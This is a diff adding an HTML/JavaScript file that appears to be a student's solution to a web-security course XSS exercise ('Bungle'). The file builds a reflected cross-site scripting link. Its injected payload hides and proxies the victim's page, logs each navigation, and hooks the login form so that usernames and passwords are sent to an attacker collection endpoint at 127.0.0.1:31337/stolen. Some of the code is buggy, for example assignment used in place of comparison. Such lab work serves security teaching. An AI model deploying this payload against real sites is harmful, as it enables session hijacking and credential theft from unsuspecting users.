@@ -1,0 +1,67 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+
+// Extend this function:
+function payload(attacker) {
+	function log(data) {
+		console.log($.param(data))
+		$.get(attacker, data);
+	}
+	function proxy(href) {
+		$("html").load(href, function(){
+			$("html").show();
+			log({event: "nav", uri: href});
+			$("#query").val("pwned!");
+			var forms = document.getElementsByTagName("form");
+			var search_form;
+			var login_form;
+			for(i = 0; i < forms.length; i++){
+				if(forms[i].action = "./search"){
+					search_form = forms[i];
+				}
+				if(forms[i].action = "./login"){
+					login_form = forms[i];
+				}
+			}
+			/*
+			search_form.onsubmit = function(){
+				var search_term = search_form.q.value;
+				log({event: "search", value: search_term});
+			}*/
+			login_form.onsubmit = function(){
+				var uname = document.getElementById("username").val();
+				console.log(uname);
+				var pword = document.getElementById("userpass").val();
+				log({event: "login", user: uname, pass: pword});
+			}
+		});
+
+		
+	}
+	$("html").hide();
+	proxy("./");
+}
+
+// make the url; the url embeds the function definition above by calling payload.toString()
+function makeLink(xssdefense, target, attacker) {
+	if (xssdefense == 0) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
+	} else {
+	// Implement code to defeat XSS defenses here.
+	}
+}
+
+var xssdefense = 0;
+var target = "http://permalink.co/";
+var attacker = "http://127.0.0.1:31337/stolen";
+
+// This part makes the <a></a> html code for the Try Bungle link
+$(function() {
+	var url = makeLink(xssdefense, target, attacker);
+	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+
+</script>
+<h3></h3>
